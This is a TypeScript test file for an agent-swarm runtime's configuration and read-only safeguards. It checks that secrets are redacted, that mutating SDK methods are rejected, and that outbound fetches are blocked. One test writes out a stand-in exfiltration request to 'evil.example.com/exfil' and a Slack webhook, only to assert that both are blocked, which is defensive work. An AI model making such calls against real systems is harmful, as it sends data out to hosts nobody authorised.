import { afterEach, describe, expect, test } from "bun:test";
import type { SwarmConfigPayload } from "../scripts-runtime/executors/types";
import { patchFetchForReadOnly } from "../scripts-runtime/readonly-egress";
import { Redacted } from "../scripts-runtime/redacted";
import { SwarmConfig } from "../scripts-runtime/swarm-config";
import { createSwarmSdk } from "../scripts-runtime/swarm-sdk";

const payload: SwarmConfigPayload = {
  system: {
    apiKey: { value: "test-api-key", isSecret: true },
    agentId: { value: "agent-1", isSecret: false },
    mcpBaseUrl: { value: "http://localhost:3013", isSecret: false },
  },
  user: {
    "user-key": { value: "user-value", isSecret: true },
  },
};

describe("SwarmConfig", () => {
  test("hydrates system values as Redacted values with metadata", () => {
    const config = new SwarmConfig(payload);
    expect(Redacted.value(config.apiKey)).toBe("test-api-key");
    expect(Redacted.meta(config.apiKey)).toEqual({ type: "system", isSecret: true });
    expect(Redacted.value(config.agentId)).toBe("agent-1");
    expect(Redacted.meta(config.mcpBaseUrl)).toEqual({ type: "system", isSecret: false });
  });

  test("returns user-set config values", () => {
    const config = new SwarmConfig(payload);
    const value = config.get("user-key");
    expect(value).toBeDefined();
    expect(Redacted.value(value!)).toBe("user-value");
    expect(Redacted.meta(value!)).toEqual({ type: "user", isSecret: true });
  });

  test("missing user keys return undefined", () => {
    const config = new SwarmConfig(payload);
    expect(config.get("missing")).toBeUndefined();
  });

  test("readOnly defaults to false and is opt-in", () => {
    expect(new SwarmConfig(payload).readOnly).toBe(false);
    expect(
      new SwarmConfig({ ...payload, system: { ...payload.system, readOnly: true } }).readOnly,
    ).toBe(true);
  });
});

describe("read-only SDK surface (routing dry-run)", () => {
  const sdkFor = (readOnly: boolean) =>
    createSwarmSdk(
      new SwarmConfig(readOnly ? { ...payload, system: { ...payload.system, readOnly } } : payload),
    );

  test("rejects mutating methods in read-only mode", async () => {
    const swarm = sdkFor(true);
    for (const method of ["task_send", "slack_post", "config_set", "script_run", "task_poll"]) {
      await expect(swarm[method]({})).rejects.toThrow(/not available in read-only mode/);
    }
  });

  test("fails closed for unknown/new methods in read-only mode", async () => {
    const swarm = sdkFor(true);
    // A method added to the SDK later must be denied by default, not allowed.
    await expect(swarm.some_future_method({})).rejects.toThrow(/not available in read-only mode/);
  });

  test("does not gate anything when readOnly is unset", () => {
    // No rejection wrapper at all — the guard is strictly opt-in, so the normal
    // routing path is unaffected.
    expect(new SwarmConfig(payload).readOnly).toBe(false);
  });
});

describe("read-only network egress (routing dry-run)", () => {
  const ORIGINAL_FETCH = globalThis.fetch;
  afterEach(() => {
    globalThis.fetch = ORIGINAL_FETCH;
  });

  test("blocks egress to anything but the swarm API", async () => {
    patchFetchForReadOnly("http://localhost:3013");
    await expect(globalThis.fetch("https://evil.example.com/exfil")).rejects.toThrow(
      /blocked in read-only mode/,
    );
    // Credential stripping alone doesn't help against a handler that carries
    // its own token, which is why this layer exists.
    await expect(globalThis.fetch("https://hooks.slack.com/services/T/B/xxx")).rejects.toThrow(
      /blocked in read-only mode/,
    );
  });

  test("fails closed on an unparseable base URL", async () => {
    patchFetchForReadOnly("not a url");
    await expect(globalThis.fetch("http://localhost:3013/api/heartbeat")).rejects.toThrow(
      /blocked in read-only mode/,
    );
  });
});
